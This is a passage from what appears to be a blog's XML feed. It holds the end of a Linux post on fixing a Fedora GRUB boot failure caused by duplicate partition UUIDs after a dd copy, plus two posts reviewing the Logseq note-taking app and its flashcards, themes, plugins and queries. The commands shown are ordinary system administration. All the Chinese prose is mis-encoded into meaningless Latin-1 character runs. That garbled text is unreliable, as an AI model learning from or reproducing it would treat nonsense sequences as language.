class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#<br># <span class="hljs-keyword">DO</span> NOT EDIT <span class="hljs-keyword">THIS</span> <span class="hljs-keyword">FILE</span><br># It is automatically generated by grub2-mkconfig using templates<br># <span class="hljs-keyword">from</span> <span class="hljs-regexp">/etc/g</span>rub.d and settings <span class="hljs-keyword">from</span> <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">default</span>/grub<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æœ‰ä¸¤ä¸ªä¿¡æ¯ï¼Œç¡®å®æ˜¯ä½¿ç”¨ grub2-mkconfig ç”Ÿæˆï¼Œ&#x2F;etc&#x2F;default&#x2F;grub é‡Œæœ‰é»˜è®¤é…ç½®</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ cat /etc/default/grub<br><br><br><span class="hljs-attribute">GRUB_TIMEOUT</span>=5<br><span class="hljs-attribute">GRUB_DISTRIBUTOR</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$(sed &#x27;s, release .*$,,g&#x27; /etc/system-release)</span>&quot;</span><br><span class="hljs-attribute">GRUB_DEFAULT</span>=saved<br><span class="hljs-attribute">GRUB_DISABLE_SUBMENU</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">GRUB_TERMINAL_OUTPUT</span>=<span class="hljs-string">&quot;console&quot;</span><br><span class="hljs-attribute">GRUB_CMDLINE_LINUX</span>=<span class="hljs-string">&quot;rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1 rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet&quot;</span><br><span class="hljs-attribute">GRUB_DISABLE_RECOVERY</span>=<span class="hljs-string">&quot;true&quot;</span><br></code></pre></td></tr></table></figure><p>grub2-mkconfig é‡ŒæŸ¥æ‰¾æ ¹ç”¨è¿™å¥</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">GRUB_DEVICE</span>=<span class="hljs-string">&quot;`$&#123;grub_probe&#125; --target=device /`&quot;</span>  <br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæŸ¥çœ‹ç»“æœï¼Œ å‘ç°æ­£ç¡®</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ grub2-probe --target=device /<br><br>/dev/sdb1<br></code></pre></td></tr></table></figure><p>å¯æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½æ­£ç¡®å¯åŠ¨å‘¢ï¼Œçœ‹çœ‹ç”Ÿæˆçš„ grub.cfg æ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">linux16</span> /vmlinuz-<span class="hljs-number">4</span>.<span class="hljs-number">17</span>.<span class="hljs-number">2</span>-<span class="hljs-number">200</span>.fc28.x86_64 root=UUID=<span class="hljs-number">290</span>a98e3-<span class="hljs-number">7937</span>-<span class="hljs-number">49</span>db-a971-<span class="hljs-number">4</span>d0e49567cf0<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨çš„æ˜¯ UUIDï¼Œå¹¶ä¸æ˜¯ &#x2F;dev, æ‰§è¡Œ <code>sudo blkid</code> æŸ¥çœ‹ä¸€ä¸‹å„åˆ†åŒºçš„ uuid</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># blkid</span><br><br>/dev/sdb1: UUID=<span class="hljs-string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span> PARTUUID=<span class="hljs-string">&quot;fe64f395-7520-42c3-939b-b17eb7064cec&quot;</span><br>/dev/mapper/fedora-root: UUID=<span class="hljs-string">&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot;</span> TYPE=<span class="hljs-string">&quot;ext4&quot;</span><br></code></pre></td></tr></table></figure><p>ç”±äºdd çš„åŸå› ï¼Œ&#x2F;dev&#x2F;sdb1 å’Œ &#x2F;dev&#x2F;mapper&#x2F;fedora-root çš„ UUID å±…ç„¶æ˜¯ç›¸åŒçš„ã€‚é¦–å…ˆæƒ³åˆ°çš„æ˜¯æŠŠ&#x2F;dev&#x2F;sdb1 çš„ UUID ç»™æ”¹äº†ã€‚æ”¾ç‹—æœå‘ç°æœ‰ä¸‹é¢çš„æ–¹æ³•</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ uuidgen <br>8e4c27b2-c63e-4d1d-8ac4-5ddd90669eb0<br><br>tune2fs /dev/&#123;device&#125; -U &#123;uuid&#125;<br></code></pre></td></tr></table></figure><p>å¯æ˜¯tune2fs æ—¶æŠ¥é”™ï¼Œæ­»æ´»æ”¹ä¸è¿‡æ¥ã€‚</p><p>lzx æç¤ºå¯ä»¥çœ‹çœ‹å¦‚ä½•æ˜¯grub.cfg ä¸ä½¿ç”¨uuidï¼Œ å‘ç°æœ‰ä¸ªå‚æ•° <code>GRUB_DISABLE_UUID=true</code>ï¼Œ åœ¨ &#x2F;etc&#x2F;default&#x2F;grub åŠ ä¸Šè¿™è¡Œï¼Œé‡æ–°ç”Ÿæˆ grub.cfg ã€‚<br><code>$ grub2-mkconfig -o /boot/grub2/grub.cfg</code></p><p>é‡å¯ï¼ŒæˆåŠŸè¿›å…¥åˆ°SSD çš„æ–° root ã€‚</p><p>æœ‰çš„ç³»ç»Ÿä¸Šçš„å‚æ•°å¯èƒ½ä¸å¤ªä¸€æ ·ï¼Œubuntu ç³»ç»Ÿé‡Œè¿™ä¸ªå‚æ•°å¥½åƒçš„æ˜¯ <code>GRUB_DISABLE_LINUX_UUID=true</code> éœ€è¦ç¡®è®¤ä¸€ä¸‹ã€‚</p><ul><li>EOF</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰</title>
    <link href="/cn/logseq2/"/>
    <url>/cn/logseq2/</url>
    
    <content type="html"><![CDATA[<p>ç”¨äº† Logseq ä¸€æ®µæ—¶é—´äº†ï¼Œåšä¸ªç®€å•çš„æ€»ç»“ï¼Œå›½å†…çš„å¾ˆå¤šæ–‡ç« ï¼Œåœ¨æˆ‘çœ‹æ¥è¿˜æ˜¯ä¸å¤Ÿç®€å•æ˜äº†, æœ¬æ–‡å¤§è‡´ä»‹ç»äº† Logseq æ¯”è¾ƒå¸¸ç”¨çš„ä¸€äº›åŠŸèƒ½çš„ä½¿ç”¨ã€‚</p><h2 id="Flashcards"><a href="#Flashcards" class="headerlink" title="Flashcards"></a>Flashcards</h2><p>å¯ä»¥æŠŠè®°å½•çš„çŸ¥è¯†ç‚¹å½“ä½œå¡ç‰‡æ¥è®°å¿†ï¼Œç”¨è¿‡ Anki çš„åŒå­¦ï¼Œåº”è¯¥éƒ½æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œä½¿ç”¨çš„è®°å¿†ç®—æ³•ä¸º <a href="https://www.supermemo.com/en/archives1990-2015/english/ol/sm5">SM-5</a><br>è¦å°†ä¸€ä¸ª block è®°ä¸ºå¡ç‰‡éå¸¸ç®€å•ï¼Œä½¿ç”¨ <code>#card</code> æ ‡ç­¾å°±å¯ä»¥äº†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq5.png"></p><h3 id="å¡ç‰‡ç»„"><a href="#å¡ç‰‡ç»„" class="headerlink" title="å¡ç‰‡ç»„"></a>å¡ç‰‡ç»„</h3><p>æœ‰äº›å¡ç‰‡å¯èƒ½æ˜¯å½’å±åŒä¸€ä¸ªå¤§ç±»ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨å¡ç‰‡ç»„äº†ã€‚åƒæˆ‘ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¦è®°å¿†çš„å•è¯éƒ½åœ¨ <code>è‹±è¯­å•è¯ç§¯ç´¯</code>ä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯­æ³• <code>&#123;&#123;cards è‹±è¯­å•è¯ç§¯ç´¯&#125;&#125;</code> æ•ˆæœå¦‚ä¸‹å›¾ï¼Œ<br>å¯ä»¥çœ‹å‡ºæˆ‘å·²ç»ç§¯ç´¯äº†7å¼ å¡ç‰‡äº†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq6.png"></p><p>è¦èƒŒè¯µéœ€è¦è®°å¿†çš„å¡ç‰‡æ—¶ï¼Œå•å‡»å·¦ä¾§çš„ Flashcards å°±å¯ä»¥äº†ï¼Œä½¿ç”¨æ–¹é¢æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œæœ‰ä¸‰ä¸ªé€‰é¡¹å¯ä»¥é€‰æ‹©ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq7.png"></p><h2 id="theme-ï¼ˆçš®è‚¤ï¼‰"><a href="#theme-ï¼ˆçš®è‚¤ï¼‰" class="headerlink" title="theme ï¼ˆçš®è‚¤ï¼‰"></a>theme ï¼ˆçš®è‚¤ï¼‰</h2><p>çš®è‚¤å°±æ˜¯é’èœèåœå„æœ‰æ‰€çˆ±äº†ï¼Œæ¨èä¸¤æ¬¾æˆ‘è‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„çš„çš®è‚¤ã€‚</p><p><img src="https://github.com/pengx17/logseq-laurel-theme/raw/master/white.png"><br><img src="https://raw.githubusercontent.com/tobealive/logseq-allday-theme/main/preview.png"></p><p>Github ä»“åº“åœ°å€å¦‚ä¸‹ï¼š</p><p><a href="https://github.com/pengx17/logseq-laurel-theme">https://github.com/pengx17/logseq-laurel-theme</a><br><a href="https://github.com/tobealive/logseq-allday-theme">https://github.com/tobealive/logseq-allday-theme</a></p><p>æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è®¾ç½®çš®è‚¤ï¼š</p><ul><li>custom.css</li><li>plugin system</li></ul><p>ä½¿ç”¨ custom.cssï¼Œæ‰“å¼€ Settings -&gt;     General -&gt;  Custom theme  ç‚¹å‡» <code>custom.css</code> å¤åˆ¶ css å†…å®¹ï¼Œä¿å­˜é€€å‡ºå³å¯ã€‚<br>ä½¿ç”¨æ’ä»¶ç³»ç»Ÿï¼Œåˆ™éœ€è¦å…ˆæŠŠæ’ä»¶ç³»ç»Ÿæ‰“å¼€ï¼ŒSettings  -&gt;  Advanced -&gt; Plug-in system ã€‚æ‰“å¼€æ’ä»¶ç³»ç»Ÿåï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<br>Plugins -&gt; Marketplace -&gt; themes é€‰æ‹©ä½ å–œæ¬¢çš„ theme ç‚¹å‡» <code>Install</code> å°±å¯ä»¥äº†</p><p>ä¸è¿‡è¿˜æ˜¯æ¨èä½¿ç”¨ Logseq è‡ªå¸¦çš„æ’ä»¶ç®¡ç†ç³»ç»Ÿæ¥å®‰è£…ï¼Œå¯ä»¥è‡ªåŠ¨å‡çº§æ¯”è¾ƒæ–¹ä¾¿ï¼Œåˆ‡æ¢çš®è‚¤å¯ä»¥ç‚¹å‡»å³ä¸Šè§’ ä¸‰ä¸ªç‚¹ -&gt; Themes é€‰æ‹©çš®è‚¤ã€‚ </p><h2 id="plugin-ï¼ˆæ’ä»¶ï¼‰"><a href="#plugin-ï¼ˆæ’ä»¶ï¼‰" class="headerlink" title="plugin ï¼ˆæ’ä»¶ï¼‰"></a>plugin ï¼ˆæ’ä»¶ï¼‰</h2><p>ä½¿ç”¨ Logseq æ’ä»¶åŒæ ·æ˜¯ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>plugin system</li><li>Load unpacked plugin</li></ul><p>ä½¿ç”¨æ’ä»¶ç³»ç»Ÿçš„æ–¹æ³•å’Œä¸Šé¢å®‰è£…çš®è‚¤çš„æ­¥éª¤å¤§è‡´ç›¸åŒï¼Œä¾æ¬¡ç‚¹å‡» Plugins -&gt; Marketplace -&gt; Plugins ï¼Œé€‰æ‹©æ’ä»¶ç‚¹å‡» <code>Install</code> å³å¯ã€‚è¦åŠ è½½ <code>unpacked plugin</code> é¦–å…ˆè¦æ‰“å¼€å¼€å‘è€…æ¨¡å¼ Settings  -&gt;  Advanced -&gt; Developer mode ,  è®¾ç½®ä¸ºæ‰“å¼€ã€‚æ‰“å¼€åä½¿ç”¨æ’ä»¶ç®¡ç†ç³»ç»Ÿ Plugins -&gt; Installed -&gt; Load unpacked plugin é€‰æ‹©ç›¸å…³ç›®å½•å°±å¯ä»¥äº†ã€‚</p><p>å…·ä½“çš„æ’ä»¶å¯ä»¥å‚è€ƒ <a href="https://github.com/logseq/awesome-logseq#Plugins">https://github.com/logseq/awesome-logseq#Plugins</a> è®°å½•çš„æ’ä»¶éƒ½æŒºä¸é”™çš„ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ’ä»¶ç³»ç»Ÿçš„ç½‘ç»œä¸å¤ªç¨³å®šï¼ˆæ€»æ‰€å‘¨çŸ¥çš„åŸå› ï¼‰ï¼Œä½¿ç”¨ä»£ç†ä¼šæ–¹ä¾¿ä¸€äº›ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">https_proxy=127.0.0.1:3128 ./Logseq --proxy-server=http://127.0.0.1:3128<br></code></pre></td></tr></table></figure><p>å®‰è£…æ’ä»¶å¯èƒ½ä¼šå‡ºç° timeout é”™è¯¯ï¼Œå¤šé‡è¯•å‡ æ¬¡å°±åº”è¯¥å¯ä»¥å®‰è£…ä¸Šäº†ã€‚</p><h2 id="query"><a href="#query" class="headerlink" title="query"></a>query</h2><p>query ç®—æ˜¯ Logseq çš„é«˜çº§åŠŸèƒ½äº†ï¼Œæˆ‘ç”¨çš„ä¹Ÿä¸å¤šï¼Œè¾“å…¥ <code>/query</code> å›è½¦å°±å¯ä»¥è‡ªåŠ¨è¿›å…¥ query äº†ï¼Œå…·ä½“çš„è¯­æ³•å¾ˆçµæ´»å¯ä»¥å‚è€ƒï¼š<br><a href="https://logseq.github.io/#/page/queries">https://logseq.github.io/#/page/queries</a></p><p>æ²¹ç®¡ä¸Šæœ‰ç›¸å…³ videoï¼Œå¤§å®¶å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<br><a href="https://www.youtube.com/watch?v=GDauxjx_bdA&ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind</a><br><a href="https://www.youtube.com/watch?v=qQ8DzumRZkM&ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind</a></p><h2 id="å†™åœ¨åé¢çš„è¯"><a href="#å†™åœ¨åé¢çš„è¯" class="headerlink" title="å†™åœ¨åé¢çš„è¯"></a>å†™åœ¨åé¢çš„è¯</h2><p>Logseq çš„åŠŸèƒ½è¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸¤ç¯‡æ–‡ç« ä¹Ÿä¸å¯èƒ½å…¨éƒ¨ä»‹ç»å®Œï¼Œå®˜æ–¹æ–‡æ¡£æ€»æ˜¯æœ€å¥½çš„èµ„æ–™ï¼š<a href="https://logseq.github.io/#/page/Contents">https://logseq.github.io/#/page/Contents</a></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://logseq.github.io/">https://logseq.github.io</a></p><p><a href="https://www.usmacd.com/cn/logseq/">https://www.usmacd.com/cn/logseq/</a><br><a href="https://www.usmacd.com/cn/logseq3/">https://www.usmacd.com/cn/logseq3/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>logseq è¯•ç”¨æŠ¥å‘Š</title>
    <link href="/cn/logseq/"/>
    <url>/cn/logseq/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åŒé“¾ç¬”è®°çš„æ¦‚å¿µæ¯”è¾ƒç«çƒ­ï¼Œ Roam Research å¤§æ¦‚æ˜¯ç¬¬ä¸€ä¸ªå®ç°æ­¤åŠŸèƒ½çš„è½¯ä»¶ï¼Œåç»­ Notionã€Obsidianã€logseq ç­‰è½¯ä»¶å¤§æ­¥è·Ÿè¿›ï¼Œè¿™äº›è½¯ä»¶å„æœ‰åƒç§‹ã€‚ä¸‹é¢è¿™æ®µæ˜¯å‚è€ƒèµ„æ–™æ–‡ç« ä¸­çš„ä¸€å°æ®µï¼Œå¾ˆæœ‰å‚è€ƒæ„ä¹‰ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Roam</span> çš„çªç ´åœ¨äºï¼Œç†è®ºä¸Šï¼ŒæŠŠè½¯ä»¶è®¾è®¡ç†å¿µä¸å¡ç‰‡ç›’ç¬”è®°æ³•ç´§ç´§æ†ç»‘ï¼š<br>å¢æ›¼ï¼ˆNiklas Luhmannï¼‰å¾—ç›Šäºå¡ç‰‡ç›’ç¬”è®°æ³•ï¼Œä»å…¬åŠ¡å‘˜æˆä¸ºå¾·å›½å½“ä»£é‡è¦çš„ç¤¾ä¼šå­¦å®¶ï¼Œ<br>å› æ­¤åŸºäºå¡ç‰‡ç›’ç¬”è®°æ³•çš„ Roam ä¹Ÿå¯ä»¥åŠ©åŠ›ä½ çš„æˆåŠŸï¼›<br>æŠ€æœ¯ä¸Šï¼Œæ¨å‡ºåŒå‘é“¾æ¥ã€å¯è§†åŒ–ç¬”è®°é—´çš„è”ç³»ã€åµŒå…¥ï¼ˆTransclusionï¼‰ç­‰åŠŸèƒ½ï¼Œ<br>è®©ç”Ÿäº§ã€æŸ¥æ‰¾ç¬”è®°æ›´åŠ é«˜æ•ˆï¼Œäºæ­¤åŒæ—¶ï¼Œè¿˜çœå´ç»´æŠ¤å±‚çº§ç»“æ„çš„éº»çƒ¦ã€‚<br></code></pre></td></tr></table></figure><p><img src="https://github.com/henices/pictures/raw/master/logseq0.jpg"><br><img src="https://github.com/henices/pictures/raw/master/logseq1.png"></p><p>ä¸Šé¢ä¸¤å¼ å›¾ç‰‡å°±æ˜¯<strong>å¡ç‰‡ç›’ç¬”è®°æ³•</strong> æœ€å½¢è±¡çš„è¡¨ç¤ºäº†ï¼Œä¸ªäººè§‰å¾—è¿™ç§æ–¹æ³•å¾ˆé€‚åˆè‡ªå·±ã€‚</p><p>ä¸ºäº†ä½“éªŒåŒé“¾ç¬”è®°ï¼Œæˆ‘èŠ±è´¹äº†ä¸å°‘æ—¶é—´ï¼Œä¸Šé¢çš„å‡ ä¸ªè½¯ä»¶éƒ½ä½“éªŒäº†ä¸€ä¸‹ï¼ŒRoam æ˜¯æ”¶è´¹è½¯ä»¶ï¼Œé“¶å­ä¸å¤Ÿæ‰€ä»¥ä¸é€‰ï¼ŒNotion ç¬”è®°å­˜å‚¨åœ¨äº‘ç«¯ï¼Œä¸ç¬¦åˆæˆ‘æ•°æ®å®‰å…¨çš„è¦æ±‚ä¹Ÿä¸é€‰ï¼Œå‰©ä¸‹çš„å°±åªæœ‰ä¸¤ä¸ªé€‰é¡¹äº† Obsidian å’Œ logseq ã€‚</p><h2 id="Obsidian"><a href="#Obsidian" class="headerlink" title="Obsidian"></a>Obsidian</h2><p>è½¯ä»¶ä¸»é¡µï¼š<a href="https://obsidian.md/">https://obsidian.md/</a><br><img src="https://github.com/henices/pictures/raw/master/logseq2.png"></p><p>æŒºå¤šäººé€‰æ‹©ç”¨ Obsidian çš„åŸå› æ˜¯å®ƒçš„ MarkDown è¯­æ³•æ”¯æŒå¾—æ¯”è¾ƒå¥½ï¼ŒMarkDown è¯­æ³•æœ‰å¾ˆå¤šçš„ä½¿ç”¨è€…ï¼Œç±»ä¼¼ Typora çš„ MarkDown ç¬”è®°è½¯ä»¶æ˜¯å½“å‰ç¬”è®°è½¯ä»¶çš„ä¸»æµï¼Œè¿™ä½¿å¾—è¿™äº›ç¬”è®°è½¯ä»¶çš„ä½¿ç”¨è€…è¿‡æ¸¡åˆ° obsidian ä¼šæ¯”è¾ƒå¹³æ»‘ã€‚æˆ‘æ˜¯å¼€æºMarkDown ç¬”è®°è½¯ä»¶ Vnote çš„é‡åº¦ä½¿ç”¨è€…ï¼Œä¸€åº¦æƒ³ä½¿ç”¨ Obsidian ä½œä¸ºä¸»åŠ›è½¯ä»¶ã€‚</p><p>Obsidian æœ‰æŒºå¤šä¼˜ç‚¹ï¼Œæ¯”å¦‚å®ƒå¯¹ä¸ªäººç”¨æˆ·æ°¸ä¹…å…è´¹ï¼Œä½†æ˜¯å®ƒä¸å¼€æºï¼Œè€Œä¸” <a href="https://help.obsidian.md/How+to/Link+to+blocks">Link+to+blocks</a> çš„è¯­æ³•æ¯”è¾ƒåˆ«æ‰­ã€‚æœ€ç»ˆè¿˜æ˜¯æ²¡æœ‰é€‰æ‹©å®ƒï¼Œæœ‰äººè¯´Obsidian æ’ä»¶éå¸¸ä¸°å¯Œï¼Œæˆ‘è‡ªå·±æ²¡æœ‰æŠ˜è…¾è¿‡ã€‚</p><h2 id="logseq"><a href="#logseq" class="headerlink" title="logseq"></a>logseq</h2><p>è½¯ä»¶ä¸»é¡µï¼š<a href="https://logseq.com/">https://logseq.com/</a><br>æºç ä»“åº“ï¼š<a href="https://github.com/logseq/logseq">https://github.com/logseq/logseq</a></p><p><img src="https://github.com/henices/pictures/raw/master/logseq3.png"></p><p>è¯´äº†è¿™ä¹ˆä¹…ç»ˆäºåˆ°æ­£ä¸»äº†ï¼Œç¬¬ä¸€æ¬¡çŸ¥é“åŒé“¾ç¬”è®°è¿™ä¸ªæ¦‚å¿µæ˜¯å› ä¸ºæœ‰ä¸ªç½‘å‹åœ¨ç½‘ä¸Šè¯´ä½¿ç”¨æ•ˆæœä¸é”™ï¼Œè¿‡æ¸¡å¾ˆå¹³æ»‘ã€‚å¯èƒ½æœ‰å…ˆå…¥ä¸ºä¸»çš„å…³ç³»ï¼Œå¦å¤–æˆ‘æœ¬äººå¯¹å¼€æºè½¯ä»¶ä¸€å‘æœ‰è«åçš„å¥½æ„Ÿï¼Œæ‰€ä»¥ä¸»è§‚æ„è¯†ä¸Šå°±å¾ˆå–œæ¬¢è¿™ä¸ªè½¯ä»¶ã€‚logseq çš„ç²’åº¦è¶³å¤Ÿï¼Œblock reference ä½¿ç”¨éå¸¸æ–¹ä¾¿ï¼Œå¦å¤– logseq çš„ PDF æ ‡è®°åŠŸèƒ½å¯¹äºéœ€è¦å¤§é‡é˜…è¯»è®ºæ–‡çš„æˆ‘æ¥è¯´éå¸¸å¥½ç”¨ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/logseq4.png"></p><p>ä½†æ˜¯ logseq ä¹Ÿä¸æ˜¯æ²¡æœ‰ç¼ºç‚¹ï¼Œlogseq å¯¹ markdown è¯­æ³•çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œå³ä½¿ç›´æ¥å¯¼å…¥ MarkDown æ–‡ä»¶ï¼Œæœ€åæ˜¾ç¤ºçš„ç»“æœæ„Ÿè§‰ä¹Ÿæ˜¯æœ‰é—®é¢˜ï¼Œå„ç±»æ ‡é¢˜ç›´æ¥è½¬åŒ–æˆ block äº†ï¼Œè¿™æ˜¯æœ‰é—®é¢˜çš„ã€‚ä½†æ˜¯ä»è¿™ä¸ªè§’åº¦è¯´ logseq å°±æ˜¯ä¸€ä¸ªçº¯ç²¹çš„åŒé“¾ç¬”è®°è½¯ä»¶è€Œä¸æ˜¯ä¸€ä¸ªæ·»åŠ äº†åŒé“¾åŠŸèƒ½çš„ MarkDown ç¬”è®°è½¯ä»¶ã€‚</p><h2 id="æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•"><a href="#æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•" class="headerlink" title="æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•"></a>æœ€ç»ˆçš„ç¬”è®°ç®¡ç†æ–¹æ³•</h2><p>è¯´åˆ°è¿™ï¼Œé—®é¢˜å°±ç®€åŒ–äº†ï¼Œå¹³æ—¶çš„æ–‡æ¡£è®°å½•ä»ç„¶ä½¿ç”¨ MarkDown ç¬”è®°è½¯ä»¶ï¼Œåªæ˜¯åœ¨å¹³æ—¶è®°å½•çš„æ—¶å€™ä½¿ç”¨åŒé“¾ç¬”è®°è½¯ä»¶ã€‚è¿™æ ·çš„ç¬”è®°ç®¡ç†æ–¹æ³•çœ‹ä¸Šå»æ¯”è¾ƒéº»çƒ¦ï¼Œå…¶å®å´å¾ˆå®Œç¾ï¼Œæƒ³å†™æ–‡ç« çš„æ—¶å€™ç›´æ¥ç”¨ VNoteï¼Œå¹³æ—¶çŸ¥è¯†ç§¯ç´¯è®°å½•çš„æ—¶å€™å°±ç”¨ logseqï¼Œæ ¹æœ¬å°±ä¸ç”¨è¿‡æ¸¡ï¼Œåªéœ€è¦å¯ç”¨ä¸€ä¸ªæ–°è½¯ä»¶å³å¯ã€‚</p><p>åŸºäº block çš„åŒé“¾ç¬”è®°æœ€å¤§çš„å¥½å¤„å°±æ˜¯æ²¡æœ‰è¾“å‡ºè´Ÿæ‹…ï¼Œä¸€äº›å¾ˆéšæ„çš„æƒ³æ³•éƒ½å¯ä»¥è®°å½•ä¸‹æ¥ï¼Œå› ä¸ºå¤§å®¶ç¡®å®ä¸å¯èƒ½æ¯æ¬¡éƒ½æœ‰å¤§æ®µçš„æƒ³æ³•å¯ä»¥è¾“å‡ºã€‚æœ‰äººè¯´ç”¨ logseqä¸€å¹´å†™äº† 30ä¸‡å­—ï¼Œæˆ‘å¼€å§‹è§‰å¾—æœ‰ç‚¹å¤¸å¼ ï¼Œä½†æ˜¯ä½¿ç”¨ä¸€ä¸ªå¤šæœˆå‘ç°å¯èƒ½å±å®ï¼Œç°åœ¨æˆ‘è‡ªå·±éƒ½å†™äº†å‡ ä¸‡å­—äº†ã€‚æ¯ä¸ªæƒ³æ³• (block) ä¹‹é—´å¯èƒ½ä¼šæœ‰è”ç³»ï¼Œä¸æ–­è®°å½•æƒ³æ³•ï¼Œä¸æ–­è”ç³»ï¼Œæ…¢æ…¢çš„çœŸèƒ½å‘ç°ä¸€äº›æ„æƒ³ä¸åˆ°çš„ä¸œè¥¿ä¹‹é—´å±…ç„¶æœ‰è”ç³»ï¼Œè€Œè¿™äº›è”ç³»å¾ˆæœ‰å¯èƒ½æ˜¯ä¸€äº›å…³é”®çš„åº•å±‚é€»è¾‘ã€‚å¹³æ—¶åœ¨è®°å½•çš„æ—¶å€™æ‰‹å·¥åˆ’åˆ†ç›®å½•ï¼Œå±‚æ¬¡å…³ç³»ï¼Œå…¶å®å·²ç»å°†ä¸€äº›æƒ³æ³•ï¼Œæ¦‚å¿µç»™é€»è¾‘åŒ–äº†ï¼Œè¿™æ ·çš„è®°å½•æ–¹æ³•å¾ˆéš¾æ‘†è„±å›ºæœ‰çš„è®¤çŸ¥ï¼Œè€ŒåŸºäº block çš„åŒé“¾ç¬”è®°å°±è‡ªç”±çš„å¤šï¼Œä¸æ–­è®°å½•ï¼Œä¸æ–­æ•´ç†ï¼Œæ±‡æ€»å°±äº¤ç»™è½¯ä»¶æ¥å®Œæˆå§ã€‚</p><p>æˆ‘ç°åœ¨å·²ç»é€šè¿‡ logseq çš„è®°å½•æƒ³æ¸…æ¥šäº†ä¸€äº›é—®é¢˜ï¼Œåœ¨å¹³æ—¶çš„å·¥ä½œè®°å½•ä¸­ä¹Ÿä¸æ–­åœ°ç¨³æ­¥èºæ—‹æ¨è¿›ï¼Œåœ¨æ­¤å‘å¤§å®¶æ¨èè¿™æ¬¾ç¬”è®°è½¯ä»¶ã€‚</p><h2 id="æœ€åçš„è¯"><a href="#æœ€åçš„è¯" class="headerlink" title="æœ€åçš„è¯"></a>æœ€åçš„è¯</h2><p>å…¶å®å·¥å…·å¹¶ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯å¹³æ—¶è¦è®°å½•ï¼Œè¦å®šæœŸè¾“å‡ºã€‚IT ç•Œæœ‰ä¸€ä¸ªè‘—åçš„æ®µå­ï¼Œä½ ä»¥ä¸ºä½ æ˜¯åœ¨å†™ blog å…¶å®ä½ åªæ˜¯åœ¨æŠ˜è…¾ wordpress ï¼šï¼‰</p><p>å…±å‹‰ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://sspai.com/post/69503">åŒé“¾ç¬”è®°è½¯ä»¶æ¨èï¼šLogseq 